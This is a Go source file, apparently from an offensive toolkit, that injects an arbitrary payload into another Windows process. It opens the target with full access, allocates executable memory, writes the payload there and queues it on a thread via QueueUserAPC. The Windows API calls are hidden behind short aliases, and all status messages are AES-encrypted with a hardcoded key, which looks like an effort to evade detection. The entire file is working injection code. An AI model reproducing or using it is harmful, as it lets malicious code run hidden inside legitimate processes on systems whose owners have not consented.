package main

import "os"
import "fmt"
import "syscall"
import "unsafe"


func GetThreads(pid uintptr) []uint32 {
   var thread_ids_slice []uint32;
   snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPTHREAD, 0)
   if err != nil {
      var cth32s_err_msg string = GetAESDecrypted_aux("+4hzQuCZKwp+TGshnZ4YYjEYg5LnbT+4YcLV65HDCuEEcxr/ClPfNIUe+Xb5WSw4", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(cth32s_err_msg, err);
   }

   type ThreadEntry32 struct {
      Size           uint32
      tUsage         uint32
      ThreadID       uint32
      OwnerProcessID uint32
      BasePri        int32
      DeltaPri       int32
      Flags          uint32
   }

   var te ThreadEntry32;
   te.Size = uint32(unsafe.Sizeof(te));
   T32F(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
 
   for{

      if (T32N(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
      if (te.OwnerProcessID == uint32(pid)){
         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
      }
   }
   CH(uintptr(snapshot));
   return thread_ids_slice;
}


func QUAPC_Inj(process_name string, pid int, payload []byte) {
   // Get PID
   if ((process_name == "") && (pid == 0)){
      var pid_name_needed_msg string = GetAESDecrypted_aux("wzTtIx0M+gAqPzBIz68RMsc5i9qLHiE10g+gNvyaZSaUUtkAt3TlSVg9Tz1BbD55", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(pid_name_needed_msg);
      os.Exit(-1);
   }
   var pid_uintptr uintptr;
   if (process_name != "") {
      var pname_msg string = GetAESDecrypted_aux("hlpFCmo6678sHfeAEXaYbsfSksA7b15+l2J07DA+Ifg=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(pname_msg, "\t\t", process_name);   
      var proc_handles_slice []uintptr = GetProcessByName(process_name);
      if (len(proc_handles_slice) < 1){
         var no_pid_err string = GetAESDecrypted_aux("+ZUE0n6BrpipISwD61hHiC5PAZ+EPHoLKvGLy65j0k7fLDNTVnTVToSQNbOe74oJ", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
         fmt.Println(no_pid_err, process_name, "\n[-] Try adding \".exe\" at the end of the process name.");
         os.Exit(-1);
      } else {
         var first_proc = proc_handles_slice[0];
         pid_uintptr = GPI(first_proc);   
      }
   } else{
         pid_uintptr = uintptr(pid)
   }
   var pid_msg string = GetAESDecrypted_aux("py7a9AvfJoG/m+X0ntf20w==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(pid_msg, "\t\t", pid_uintptr);

   // OpenProcess
   var proc_handle uintptr = OP(0x001F0FFF, 0, pid_uintptr);
   if (proc_handle == 0){
      var op_err_msg string = GetAESDecrypted_aux("Gc8MOh6Rm5lRenfANRydiasM/VSpiureRY50Z67ggWc=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(op_err_msg);
      os.Exit(-1);
   }
   var phandle_msg string = GetAESDecrypted_aux("GmXwK3jTrERbxsg/83s/1KUgLfuHa5sgJ00z9xDUsBY=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(phandle_msg, "\t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   var assigned_address uintptr = VAEx(proc_handle, 0, uintptr(len(payload)), 0x1000, 0x20);
   if (assigned_address == 0){
      var vaex_err_msg string = GetAESDecrypted_aux("xsfMFPbyUHUHfPzpm9EWlrEkUk0cgIEPj6mKs/vkaXr6pe/XdjMIU5Jy+XlDBG2g", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(vaex_err_msg);
      os.Exit(-1);
   }
   var assigned_address_msg string = GetAESDecrypted_aux("tD2QO8vGhvASCEhp2bfR4uOMd7UVfobBHNNMLn6Kff4=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(assigned_address_msg, "\t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   var res uintptr = WPM(proc_handle, assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      var wpm_err_msg string = GetAESDecrypted_aux("9m7i5xgFtmGk8npUcyx7pdGI5c0JPe72Fh0iGjejzUsslgSgjmVYer0HebvKLYvj", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(wpm_err_msg);
      os.Exit(-1);
   }
   var wpm_msg string = GetAESDecrypted_aux("blovpSERXH0jTY59ppKpHfSYAxVuyAiOT8IeU8+oock=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(wpm_msg, res);

   // OpenThread
   var thread_ids_slice []uint32 = GetThreads(pid_uintptr);
   var first_thread uint32 = thread_ids_slice[0];
   var first_thread_msg string = GetAESDecrypted_aux("DaUQUOz7d5lN4eYrgGZLi5s4MGJnqvJgABJ3Ase1w6Q=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(first_thread_msg,"\t\t", first_thread);
   var thread_handle uintptr = OT(0x0010, 0, first_thread);
   var thread_handle_msg string = GetAESDecrypted_aux("fDLC3fPg4y+uU5BzkCyOycMskycwGZNmGtDQtgqOwOU=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(thread_handle_msg, "\t\t", thread_handle, "(", fmt.Sprintf("0x%x", thread_handle), ")");

   // QueueUserAPC
   var QUAPC_res uintptr = QUAPC(assigned_address, thread_handle, 0);
   var quapc_res_msg string = GetAESDecrypted_aux("rxoZmXN1y3KDiTd/Dma+Te3g/KtIy2ppcBpbZkmyn20=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(quapc_res_msg, "\t", QUAPC_res);

   // CloseHandle
   CH(thread_handle);
   CH(proc_handle);
}